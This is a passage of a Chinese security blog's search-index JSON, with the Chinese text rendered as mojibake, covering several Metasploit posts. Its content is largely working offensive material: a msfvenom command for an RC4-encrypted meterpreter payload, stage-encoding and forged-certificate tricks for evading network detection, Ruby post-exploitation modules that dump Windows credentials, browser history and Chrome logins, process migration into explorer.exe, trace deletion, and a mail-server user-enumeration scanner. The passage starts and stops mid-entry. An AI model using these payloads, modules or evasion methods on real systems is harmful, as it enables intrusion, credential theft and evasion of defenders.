EOF) cat EOFè¿½åŠ ä¸è¦†ç›– Shellç‰¹æ®Šå˜é‡ chattr touch","categories":[{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://payloads.cn/tags/Linux/"}]},{"title":"Metasploitæµé‡åˆ†æä¸åå–è¯","slug":"Metasploitæµé‡åˆ†æä¸åå–è¯","date":"2020-08-10T07:21:21.000Z","updated":"2021-07-07T07:16:30.659Z","comments":true,"path":"2020/0810/.html","link":"","permalink":"https://payloads.cn/2020/0810/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€Metasploitå·²è¢«æ¸—é€æµ‹è¯•äººå‘˜å¹¿æ³›ä½¿ç”¨å¹¶å¹¿ä¸ºäººçŸ¥ã€‚å½“ä½¿ç”¨Metasploitè¿›è¡Œå‘½ä»¤æ§åˆ¶ï¼Œå¦‚ä¸è¿›è¡ŒåŠ å¯†ä¼ è¾“ï¼Œå°±ä¼šè®©é˜²å¾¡è€…åœ¨ç½‘ç»œæµé‡åˆ†ææ—¶ï¼Œè½»æ¾å‘ç°å’Œæå–æ”»å‡»è€…çš„ç½‘ç»œæ´»åŠ¨è¡Œè¸ªã€‚ æ‰€ä»¥ï¼Œç½‘ç»œæµé‡åŠ å¯†ä¼ è¾“å°±æˆä¸ºäº†å¿…é€‰é¡¹ã€‚ Metasploitæµé‡åˆ†æShell payloadèµ·åˆå…ˆç”¨payload windows/x64/shell/bind_tcpè¿›è¡Œäº¤äº’ï¼Œè¿™æ˜¯ä¸€ä¸ªcmd shellã€‚ åœ¨ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œå½“å‘½ä»¤æ§åˆ¶æ—¶ï¼Œç½‘ç»œæ•°æ®åŒ…æ˜¯ä»¥æ˜æ–‡å½¢å¼å‘é€å’Œæ¥æ”¶çš„ã€‚å®‰å…¨è®¾å¤‡åœ¨è®°å½•çš„åŒæ—¶ï¼Œè¿˜ä¼šè§¦å‘å‘Šè­¦ï¼Œä»è€Œè¢«å‘ç°ã€‚ Meterpreter Payloadæ¥ä¸‹æ¥çœ‹ä¸‹payload windows/x64/meterpreter/bind_tcpï¼Œè¿™æ˜¯ä¸€ä¸ªé«˜çº§shellã€‚ åœ¨è¿›å…¥sessionåï¼Œè®©æˆ‘ä»¬æ£€æŸ¥æµé‡ã€‚ è¿™æ˜¯å»ºç«‹è¿æ¥ä¸æ‰§è¡Œå‘½ä»¤çš„è¿‡ç¨‹ã€‚è™½ç„¶è¯´å‘½ä»¤æ‰§è¡Œçš„è¿‡ç¨‹å·²ç»è¿›è¡Œäº†åŠ å¯†å¤„ç†ï¼Œç»§ç»­è¿›è¡Œæ´»åŠ¨ï¼Œé˜²å¾¡è€…ä¹Ÿä¸ä¼šå‘ç°æœ‰ä»·å€¼çš„æ•°æ®ï¼Œä½†å¯ä»¥è§‚å¯Ÿåˆ°æ¯ä¸ªæ•°æ®éƒ½åŒ…å«MZæ ‡å¤´å’ŒDOSæ¨¡å¼å¼‚å¸¸ã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®‰å…¨è®¾å¤‡ä¹Ÿä¼šæ£€æµ‹åˆ°æ­¤æ´»åŠ¨ï¼Œè§¦å‘è­¦æŠ¥ã€‚è¿™å°±æ„å‘³ç€è¿™å°ä¸»æœºçš„æƒé™å°±ä¼šå¤±å»ã€‚ Metasploitåå–è¯Stage Encoderåœ¨ä¸ä½¿ç”¨é¢å¤–æ¨¡å—çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•è¿›è¡Œå†æ¬¡åŠ å¯†ï¼Ÿè¿™é‡Œä½¿ç”¨enablestageencodingä¸stageencoderï¼ŒæŠŠå‘é€çš„stageè¿›è¡Œç¼–ç ï¼Œç¼–ç æ–¹å¼è¾ƒå¤šï¼Œè¿™é‡Œé€‰ç”¨çš„æ˜¯x86/shikata_ga_naiã€‚ 123msf5 exploit(multi/handler) &gt; set enablestageencoding trueenablestageencoding =&gt; truemsf5 exploit(multi/handler) &gt; set stageencoder x86/shikata_ga_nai å†æ¬¡æŸ¥çœ‹æ•°æ®åŒ…ï¼Œç›¸åŒé˜¶æ®µçš„æ•°æ®å·²ç¼–ç ï¼Œæ•°æ®å·²ç»æ— æ³•è¯†åˆ«ã€‚ TLSTLSé€šå¸¸æ˜¯é€ƒé¿ç½‘ç»œæ£€æµ‹çš„é€‰é¡¹ä¹‹ä¸€ï¼ŒmetasploitåŒæ ·ä¹Ÿæä¾›äº†payload windows/x64/meterpreter_reverse_httpsï¼Œè¿›è¡Œå»ºç«‹TLSåŠ å¯†ä¼ è¾“ã€‚ reverse_httpsä½¿ç”¨çš„æ˜¯metasploitåˆ›å»ºçš„è‡ªç­¾åè¯ä¹¦å»ºç«‹çš„TLSé€šä¿¡ã€‚è™½ç„¶è¯´æ•°æ®æ˜¯åŠ å¯†çš„ï¼Œä½†ä¸ä»£è¡¨ä¸ä¼šè¿›è¡ŒéªŒè¯ã€‚ è¦ä½¿ç”¨ä¸åŒçš„è¯ä¹¦ï¼Œå¯ä»¥è´­ä¹°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªç­¾åã€‚ä½†metasploitçš„auxiliary/gather/impersonate_sslæ¨¡å—å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåˆ›å»ºä¸åŒçš„ä¼ªè¯ä¹¦ã€‚ reverse_httpsçš„é«˜çº§é€‰é¡¹ä¸­æœ‰handlersslcertè®¾ç½®ã€‚ å°†impersonate_sslè¾“å‡ºçš„pemæ ¼å¼è¯ä¹¦è·¯å¾„è½½å…¥ã€‚ 1msf5 exploit(multi/handler) &gt; set handlersslcert /Users/anonysec/.msf4/loot/20200807180153_default_112.80.248.75_112.80.248.75_pe_628298.pem RC4 payloadRC4ï¼ŒRivest Cipher 4ï¼Œæ˜¯ä¸€ç§å¯†é’¥é•¿åº¦å¯å˜çš„æµåŠ å¯†ç®—æ³•ï¼Œå±äºå¯¹ç§°åŠ å¯†çš„åˆ†æ”¯ã€‚è¯¦æƒ… RC4 Wikiè¿™æ˜¯metasploitæ”¯æŒçš„ä¸€ç§åŠ å¯†ç®—æ³•ã€‚ ä¸‹é¢æ¥çœ‹payload windows/x64/meterpreter/bind_tcp_rc4çš„æ•°æ®åŒ…ã€‚ æ•°æ®åŒ…å·²ç»å®Œå…¨è¿›è¡Œäº†åŠ å¯†ä¼ è¾“å¤„ç†ï¼Œæ‰€æœ‰çš„å‘½ä»¤æ§åˆ¶éƒ½å·²ç»è¿›è¡Œäº†éšè—ã€‚é˜²å¾¡è€…åªèƒ½å‘ç°è¿™æ˜¯TCPçš„æµé‡ï¼Œä½†æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ã€‚éœ€è¦æ³¨æ„ï¼šRC4PASSWORD è®°å¾—æ›´æ”¹ï¼ 1msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=Admin@1qaz LPORT=53 -f exe &gt; x64bind_rc4.exe","categories":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://payloads.cn/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”ä¸»æœºä¿¡æ¯æ”¶é›†","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”ä¸»æœºä¿¡æ¯æ”¶é›†","date":"2020-07-18T02:26:12.000Z","updated":"2021-08-19T06:29:04.051Z","comments":true,"path":"2020/0718/.html","link":"","permalink":"https://payloads.cn/2020/0718/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn é¡¹ç›®åœ°å€ï¼šMetasploit Modules å‰è¨€ æ¸—é€çš„æœ¬è´¨æ˜¯ä¿¡æ¯æœé›† â€”â€” Micropoor æ­¤ç¯‡æ–‡ç« ä½œä¸ºåæ¸—é€æ¨¡å—ä¿¡æ¯æ”¶é›†çš„æŠ›ç –å¼•ç‰ã€‚æ¯•ç«Ÿï¼Œä¸€åœºçº¢è“åŒæ–¹çš„å¯¹æŠ—ï¼Œä¹Ÿæ˜¯æ—¶é—´çš„è¾ƒé‡ã€‚ æ¨¡å—å®ç°ï¼šæ”¶é›† å·²å®‰è£…çš„åº”ç”¨ç¨‹åºã€ä¸»æœºå‡­æ®cmdkey /list &amp;&amp; vaultcmd /listã€ç½‘ç»œè¿æ¥netstat -ano|findstr ESTABLISHEDã€Internet Explorerå†å²è®°å½•ã€Google Chrome å†å²è®°å½•ä¸ä¿å­˜çš„å¯†ç ã€‚ å›é¡¾MetasploitMetasploitçš„åæ¸—é€ä¿¡æ¯æ”¶é›†æ¨¡å—è¾ƒå¤šï¼Œå¦‚winenumï¼Œç»å¯¹æ˜¯ä¸€æ¡é¾™ï¼Œæ”¶é›†çš„ä¿¡æ¯ä¹Ÿæ¯”è¾ƒå…¨é¢ã€‚ä½†å¦‚æœsessionsè¾ƒå¤šï¼Œæ‰¹é‡æ‰§è¡Œæ—¶å°±ä¼šå½±å“æ•ˆç‡ï¼Œä¸èƒ½åšåˆ°å¿«é€ŸåŒ–ä¿¡æ¯æ”¶é›†ã€‚ 1meterpreter &gt; run winenum å·²å®‰è£…åº”ç”¨ç¨‹åºå¼•ç”¨post/windows/gather/enum_applicationsã€‚ å‡­æ®ç®¡ç†å™¨æ”¶é›†å‡­æ®ç®¡ç†å™¨ä¸­çš„ä¿¡æ¯ï¼Œä½¿ç”¨ cmdkey /list[åˆ—å‡ºWindowså‡­æ®]ä¸vaultcmd /list[åˆ—å‡ºä¿ç®¡åº“(vault)åˆ—è¡¨]ã€‚ä½†åœ¨metasploitç»ˆç«¯ä¸­ï¼Œä¸­æ–‡è¾“å‡ºä¼šä½¿ä¹±ç ï¼Œé™¤éå°†ç»ˆç«¯çš„ç¼–ç æ ¼å¼æ”¹å˜ï¼Œè¿™é‡Œç›´æ¥chcp 437è‹±æ–‡è¾“å‡ºã€‚ å…·ä½“è§£å¯†å·¥å…· Webå‡­æ® Get-VaultCredential.ps1 Windowså‡­æ® Invoke-WCMDump.ps1 Windowsä¸­Credential Managerçš„ä¿¡æ¯è·å– 12345def credential print_line (&quot;\\nHost Credentials\\n================&quot;) cred = cmd_exec(&quot;cmd.exe /c chcp 437 &amp;&amp; cmdkey /list &amp;&amp; vaultcmd /list&quot;) print_line (&quot;#&#123;cred&#125;&quot;)end NetstatåŒæ ·ï¼Œä½†æ­¤å¤„åªæ˜¾ç¤ºå·²å»ºç«‹è¿æ¥çš„ã€‚ Internet Explorerå†å²è®°å½•åœ¨Internet Explorerä¸­è¾“å…¥çš„ç½‘å€ä¿ç•™åœ¨ HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TypedURLsã€‚ æ‰€ä»¥è¿™é‡Œéœ€è¦Msf::Post::Windows::Registryï¼Œå°†urlå€¼å–å‡ºã€‚ 12345678910111213def ie_history print_line (&quot;\\nIE History\\n==========&quot;) keys = registry_enumvals(&quot;HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs&quot;) if (not keys.empty?) while(not keys.empty?) key = keys.shift valname = registry_getvaldata(&quot;HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs&quot;,&quot;#&#123;key&#125;&quot;) print_line (&quot;#&#123;valname&#125;&quot;) end else print_error(&quot;NO History Data.&quot;) endend Google Chromeå†å²è®°å½•Google Chromeçš„å†å²è®°å½•å­˜æ”¾åœ¨%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Historyã€‚ åªéœ€è¦ä»ç›®æ ‡æœºä¸­å°†history.sqliteä¸‹è½½åˆ°æœ¬åœ°ï¼Œä½¿ç”¨sqlite3ç±»æ‰§è¡Œsqlè¯­å¥åæŠŠurlè¾“å‡ºã€‚ 12345require &#x27;sqlite3&#x27;file = &quot;#&#123;rhost&#125;-Chrome_history.sqlite&quot;maildb = SQLite3::Database.new(file)urls = maildb.execute(&quot;select url from urls;&quot;) ç™»å½•ä¿¡æ¯åŒç†ï¼ŒGoogle Chromeä¸­ä¿å­˜çš„å¯†ç ï¼Œè®°å½•åœ¨%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Dataã€‚å¯†ç çš„è§£å¯†éœ€è¦win32crypt.CryptUnprotectDataï¼Œå…¶å®åœ¨Metasploitä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨railgunå»è°ƒç”¨Windows APIã€‚ ä½†è§£å¯†è¿‡ç¨‹å®åœ¨æ˜¯æ²¡æœ‰å¤„ç†å¥½ï¼Œæ‰€ä»¥è¿™å—åªèƒ½å°†Google Chromeä¸­ä¿å­˜å¯†ç çš„Urlä¸Usernameè¾“å‡ºï¼Œå†å€ŸåŠ©å…¶å®ƒå·¥å…·æˆ–RDPç™»å½•è¿›è¡ŒæŸ¥çœ‹ã€‚(åç»­æ·±å…¥ç ”ç©¶railgunè°ƒç”¨Windows API) å­˜åœ¨é—®é¢˜æœ€åï¼Œåœ¨æµ‹è¯•æ¨¡å—è¿‡ç¨‹ä¸­å‘ç°ï¼šä½¿ç”¨msfvenomç”Ÿæˆpayloadå¼¹å›çš„sessionå¯ä»¥å®Œå…¨æ“æ§æ³¨å†Œè¡¨ï¼Œä½†ä½¿ç”¨exploit/windows/smb/psexecä¼ é€’å¼¹å›çš„sessionï¼Œå´ä¸èƒ½å®Œå…¨æ“æ§æ³¨å†Œè¡¨ã€‚(å…·ä½“åŸå› æœªçŸ¥) 12345678def run ver = registry_getvaldata(&quot;HKLM\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer&quot;, &quot;Version&quot;) print_line(&quot;\\nIE Version: #&#123;ver&#125;&quot;) keys = registry_key_exist?(&quot;HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\TypedURLs&quot;) print_good(&quot;#&#123;keys&#125;&quot;) ver = registry_getvaldata(&quot;HKCU\\\\Software\\\\Google\\\\Chrome\\\\BLBeacon&quot;, &quot;version&quot;) print_line(&quot;\\nChrome Version: #&#123;ver&#125;&quot;)end è§£å†³åŠæ³•ï¼šåŠ ä¸Šå½“å‰è¿›ç¨‹è‡ªåŠ¨æ³¨å…¥åˆ°explorer.exeçš„é€‰é¡¹ï¼Œé˜²æ­¢æ¨¡å—æŠ¥é”™ã€‚ 123456789101112131415# migrate to explorer.exedef migrate(pid=nil) current_pid = session.sys.process.open.pid target_pid = session.sys.process[&quot;explorer.exe&quot;] if target_pid != current_pid print_status(&quot;Current PID #&#123;current_pid&#125;, migrating into explorer.exe, PID #&#123;target_pid&#125;.&quot;) begin session.core.migrate(target_pid) rescue ::Exception =&gt; e print_error(e) return false end end return trueend å®Œæ•´æ¨¡å—è¿è¡ŒDemoï¼š æ‰¹é‡æ‰§è¡Œ 1msf5 &gt; sessions -C &quot;run post/windows/gather/collect migrate=true&quot; References Metasploit API Metasploit WIKI","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”å®‰å…¨æ—¥å¿—åˆ†æ","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”å®‰å…¨æ—¥å¿—åˆ†æ","date":"2020-07-02T17:56:32.000Z","updated":"2021-08-19T06:29:31.627Z","comments":true,"path":"2020/0703/.html","link":"","permalink":"https://payloads.cn/2020/0703/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn é¡¹ç›®åœ°å€ï¼šMetasploit Modules å‰è¨€å¯¹äºWindowså®‰å…¨æ—¥å¿—çš„åˆ†æï¼Œå¯ä»¥åˆ¤æ–­å‡ºå“ªäº›IPå¯¹è¯¥ä¸»æœºè¿›è¡Œç™»å½•è¿‡ã€‚å½“ç„¶ï¼Œè¿™ä¹Ÿå¯ä»¥ä½œä¸ºå†…ç½‘æ¨ªå‘çš„ç›®æ ‡ä¹‹ä¸€ã€‚é€šè¿‡PowerShellå°±å¯ä»¥å®Œæˆæ­¤æ“ä½œï¼Œä½†ç”¨Metasploitå¦‚ä½•å®ç°å†…å­˜æ‰§è¡Œps1å‘¢? EventLog.ps1é¦–å…ˆç®€å•è§£è¯»ä¸‹EventLog.ps1ï¼šå®ƒä½¿ç”¨WEVTUtil+PowerShellå°†å¤–éƒ¨æ—¥å¿—å¯¼å‡ºcsvï¼Œæ­¤ç§æ–¹æ³•ä¼˜ç‚¹å°±æ˜¯å¿«ï¼Œéœ€è¦å¯¼å…¥å¤–éƒ¨evtxã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051Param ( [string]$evtx = $pwd.Path+&quot;\\*_Security.evtx&quot;)$time=Get-Date -Format h:mm:ss$evtx=(Get-Item $evtx).fullname$outfile=&quot;C:\\Windows\\Temp\\&quot;+(Get-Item $evtx).BaseName+&quot;.csv&quot;$logsize=[int]((Get-Item $evtx).length/1MB)write-host [+] $time Load $evtx &quot;(&quot;Size: $logsize MB&quot;)&quot; ... -ForegroundColor Green[xml]$xmldoc=WEVTUtil qe $evtx /q:&quot;*[System[Provider[@Name=&#x27;Microsoft-Windows-Security-Auditing&#x27;] and (EventID=4624 or EventID=4625)] and EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;3&#x27;] or EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;]]&quot; /e:root /f:Xml /lf$xmlEvent=$xmldoc.root.Eventfunction OneEventToDict &#123; Param ( $event ) $ret = @&#123; &quot;SystemTime&quot; = $event.System.TimeCreated.SystemTime | Convert-DateTimeFormat -OutputFormat &#x27;yyyy&quot;/&quot;MM&quot;/&quot;dd HH:mm:ss&#x27;; &quot;EventID&quot; = $event.System.EventID &#125; $data=$event.EventData.Data for ($i=0; $i -lt $data.Count; $i++)&#123; $ret.Add($data[$i].name, $data[$i].&#x27;#text&#x27;) &#125; return $ret&#125;filter Convert-DateTimeFormat&#123; Param($OutputFormat=&#x27;yyyy-MM-dd HH:mm:ss fff&#x27;) try &#123; ([DateTime]$_).ToString($OutputFormat) &#125; catch &#123;&#125;&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Extract XML ... -ForegroundColor Green[System.Collections.ArrayList]$results = New-Object System.Collections.ArrayList($null)for ($i=0; $i -lt $xmlEvent.Count; $i++)&#123; $event = $xmlEvent[$i] $datas = OneEventToDict $event $results.Add((New-Object PSObject -Property $datas))|out-null&#125;$time=Get-Date -Format h:mm:sswrite-host [+] $time Dump into CSV: $outfile ... -ForegroundColor Green$results | Select-Object SystemTime,IpAddress,TargetDomainName,TargetUserName,EventID,LogonType | Export-Csv $outfile -NoTypeInformation -UseCulture -Encoding Default -Force EventID=4624 æˆåŠŸç™»å½•EventID=4625 å¤±è´¥ç™»å½•Logon type 3 Network ç½‘ç»œç™»å½•Logon Type 10 RemoteInteractive è¿œç¨‹ç™»å½• å€ŸåŠ©EventLog.ps1ï¼Œæ¥ä¸‹æ¥å¼€å§‹ç¼–å†™Metasploitæ¨¡å—ã€‚ æ‰§è¡Œå‘½ä»¤å…ˆè¦å¯¼å‡ºå®‰å…¨æ—¥å¿—ï¼Œå°±éœ€è¦è¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™é‡Œä½¿ç”¨meterpreterä¸­çš„executeï¼Œå¹¶åˆ›å»ºéšæœºåå­—å¯¼å‡ºã€‚ 1234567# éšæœºå­—æ¯æ•°å­—8ä½sec = Rex::Text.rand_text_alphanumeric(8)print_good(&quot;#&#123;sec&#125;&quot;)# lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb# wevtutil.exeç®¡ç†å‘˜æƒé™è¿è¡Œsession.sys.process.execute(&quot;wevtutil.exe epl Security C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.evtx&quot;) è½½å…¥ps1åŸæœ¬æƒ³å°†EventLog.ps1å†™åœ¨è¯¥æ¨¡å—ä¸­ï¼Œä¹‹åè¯»å–å†™å…¥åœ¨ç›®æ ‡æœºä¸­ï¼Œå†å»æ‰§è¡Œã€‚ä½†.ps1æ ¼å¼éœ€è¦è°ƒæ•´ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚ æ¢ä¸ªæ€è·¯ï¼Œæœ¬åœ°è½½å…¥è¯»å–ã€‚ç»å‡ ç•ªæŸ¥é˜…ï¼ŒMetasploitå¯ä»¥å†…å­˜åŠ è½½ï¼Œè¿™æ ·å°±ä¸éœ€è¦å°†è„šæœ¬ä¸Šä¼ åˆ°ç›®æ ‡æœºä¸­ï¼Œä½†éœ€è¦å°†EventLog.ps1æå‰æ”¾åœ¨/data/post/powershell/EventLog.ps1ç›®å½•ä¸‹ã€‚(å¯è‡ªå®šä¹‰) 123456789101112131415command = &quot;C:\\\\Windows\\\\Temp\\\\&quot; + &quot;#&#123;sec&#125;.evtx&quot;def execute_eventlog_script(command) print_good(&quot;Start Execute EventLog Script ...&quot;) # /data/post/powershell/EventLog.ps1 psh_script = File.read(File.join(Msf::Config.data_directory, &quot;post&quot;, &quot;powershell&quot;, &quot;EventLog.ps1&quot;)) # å‹ç¼©è„šæœ¬ compressed_script = compress_script(psh_script) + command # print_status(&quot;#&#123;compressed_script&#125;&quot;) cmd_out, runnings_pids, open_channels = execute_script(compressed_script) while(log = cmd_out.channel.read) print (&quot;#&#123;log&#125;&quot;) endend æ³¨ï¼šå› æ˜¯å†…å­˜åŠ è½½ï¼Œç›®æ ‡æœºä¸éœ€è¦å¼€å¯è¿è¡Œps1è„šæœ¬ã€‚ ä¸è¦å¿˜è®°è½½å…¥Powershellç±»ã€‚ 1include Msf::Post::Windows::Powershell æ–‡ä»¶æ“ä½œæ—¢ç„¶å®‰å…¨æ—¥å¿—å·²ç»è¢«åˆ†æå®Œæˆäº†ï¼Œé‚£å°±éœ€è¦å°†åˆ†æç»“æœå–å›æœ¬åœ°ï¼Œå¹¶å°†é—ç•™åœ¨ç›®æ ‡ä¸­çš„æ–‡ä»¶è¿›è¡Œåˆ é™¤ï¼Œè¿™é‡Œä½¿ç”¨meterpreterä¸­çš„downloadä¸rmã€‚ 123456dir = Msf::Config.loot_directory# lib/rex/post/meterpreter/extensions/stdapi/fs/file.rbsession.fs.file.download_file(&quot;#&#123;dir&#125;/#&#123;rhost&#125;-Security.csv&quot;,&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.csv&quot;)session.fs.file.rm(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.evtx&quot;)session.fs.file.rm(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;sec&#125;.csv&quot;) å®Œæ•´æ¨¡å—è¿è¡ŒDemoï¼š References Metasploit API Metasploit WIKI Outlook.rb","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”é‚®æœç”¨æˆ·æšä¸¾","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”é‚®æœç”¨æˆ·æšä¸¾","date":"2020-05-31T15:52:26.000Z","updated":"2021-08-19T06:28:47.997Z","comments":true,"path":"2020/0531/.html","link":"","permalink":"https://payloads.cn/2020/0531/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn é¡¹ç›®åœ°å€ï¼šMetasploit Modules å‰è¨€æœ¬æ–‡å¼€å§‹å­¦ä¹ Metasploit Webç±»æ¨¡å—å¼€å‘ï¼Œä»HTTPClientç±»çš„äº†è§£ï¼Œåˆ°Httpæ•°æ®åŒ…çš„Getä¸Postè¯·æ±‚å‘é€ï¼Œä»è€Œå®ç°æ¨¡æ‹Ÿå‘åŒ…ï¼Œæœ€ç»ˆåˆ°å®ç°æŸé‚®æœæ¥å£æšä¸¾ç”¨æˆ·çš„åŠŸèƒ½æ¨¡å—ã€‚ HTTPClientHttpClient mixinæ˜¯å‘é€åŸºæœ¬HTTPè¯·æ±‚çš„æ¨¡å—ã€‚ Geté¦–å…ˆcopyä¸‹å®˜æ–¹çš„ä¾‹å­ï¼Œè¿›è¡Œå‘é€getè¯·æ±‚ã€‚ 123456789101112131415161718def run uri = target_uri.path res = send_request_cgi(&#123; &#x27;method&#x27; =&gt; &#x27;GET&#x27;, &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;admin&#x27;, &#x27;index.php&#x27;), &#x27;vars_get&#x27; =&gt; &#123; &#x27;p1&#x27; =&gt; &quot;This is param 1&quot;, &#x27;p2&#x27; =&gt; &quot;This is param 2&quot; &#125; &#125;) if res &amp;&amp; res.code == 200 print_good(&quot;I got a 200, awesome&quot;) else print_error(&quot;No 200, feeling blue&quot;) endend åœ¨å‘åŒ…è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ç»“åˆæŠ“åŒ…ï¼ŒæŸ¥çœ‹å®é™…å‘é€çš„Httpæ•°æ®åŒ…ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å°†Requestä¸Responseè¾“å‡ºæŸ¥çœ‹ã€‚ 12print_good (&quot;Request: \\n#&#123;res.request.to_s&#125;&quot;)print_good (&quot;Response: \\n#&#123;res.to_s&#125; \\n&quot;) å®Œæ•´çš„Requestä¸ResponseHttpæ•°æ®åŒ…è¯·æ±‚ã€‚ PostPostè¯·æ±‚åªéœ€è¦å°†&#39;method&#39;=&gt;&#39;POST&#39;ï¼Œå¹¶åŠ ä¸Špost_dataã€‚ 1234567post_data = (&quot;username=admin&quot;)res = send_request_cgi(&#123; &#x27;method&#x27; =&gt; &#x27;POST&#x27;, &#x27;uri&#x27; =&gt; normalize_uri(uri, &#x27;/index.html&#x27;), &#x27;ctype&#x27; =&gt; &#x27;text/x-json&#x27;, &#x27;data&#x27; =&gt; post_data&#125;) è‡³æ­¤ï¼Œé€šè¿‡HttpClient mixinï¼Œå·²ç»å®ç°äº†Httpæ•°æ®åŒ…çš„Getä¸Postè¯·æ±‚å‘é€ã€‚ ModuleæŸé‚®æœï¼Œå¯é€šè¿‡ç”¨æˆ·æ¥å£ï¼Œæšä¸¾å­˜åœ¨çš„ç”¨æˆ·åã€‚æ¥ä¸‹æ¥è¦å°†è¯¥åˆ©ç”¨æ–¹å¼è½¬åŒ–ä¸ºMetasploitçš„æ‰«ææ¨¡å—ã€‚ å­—å…¸è¯»å–é¦–å…ˆè¦æ¢æµ‹ç”¨æˆ·æ¥å£æ˜¯å¦å­˜åœ¨ï¼Œä¹‹åæ‰èƒ½ç»§ç»­ä¸‹é¢æ“ä½œã€‚æ‰“å¼€ç”¨æˆ·åå­—å…¸ï¼Œè¿›è¡Œè¯»å–ã€‚ 12345678910111213141516if res.code.to_s == &#x27;200&#x27; print_status(&quot;Exist username interface, start enumerating ...&quot;) # æ•°ç»„ï¼šç”¨æˆ·åè¡Œåˆ†å‰² queue = [] File.open(datastore[&#x27;USER_FILE&#x27;]).each_line do |users| queue &lt;&lt; users.strip end print_status (&quot;#&#123;queue&#125;&quot;) while(not queue.empty?) # åˆ é™¤å¹¶è·å–æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´  user = queue.shift print_status (&quot;#&#123;user&#125;&quot;) end else print_error(&quot;Exist not username interface&quot;)end æ•°æ®å¤„ç†å› è¯·æ±‚æ•°æ®æ˜¯jsonæ ¼å¼ï¼Œæ‰€ä»¥post_dataéœ€è¦è¿›è¡Œè½¬æ¢ã€‚ 12345data = &#123;&quot;email&quot;:&quot;#&#123;user&#125;&quot;&#125;print_status (&quot;#&#123;data&#125;&quot;)# è½¬æ¢jsonpost_data = data.to_jsonprint_status (&quot;json: #&#123;post_data&#125;&quot;) è½¬æ¢å‰åå¯¹æ¯”ï¼š å› Responseè¿”å›åŒ…æ˜¯xmlæ ¼å¼ï¼Œæ‰€ä»¥è¦è¿›è¡Œxmlè§£æã€‚è¿™æ ·ï¼Œå°±é€šè¿‡Metasploitå®ç°äº†è¯¥åˆ©ç”¨æ¨¡å—çš„Httpæ•°æ®åŒ…çš„å‘é€ä¸æ¥æ”¶ã€‚ 123# è§£æxmlxml = res.get_xml_documentprint_good (&quot;Response_xml\\n#&#123;xml&#125;&quot;) æœ€åå°†Response_xmlä¸­çš„æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¹¶æŠŠå­˜åœ¨çš„ç”¨æˆ·åå†™å…¥txtæ–‡æœ¬ä¸­ã€‚ 123456789101112131415161718# è¾“å‡ºæ–‡ä»¶æ ¼å¼outfile = store_loot( &quot;MailUser&quot;, &quot;text/plain&quot;, rhost, &quot;&quot;) # atæŸ¥æ‰¾stringå…ƒç´ 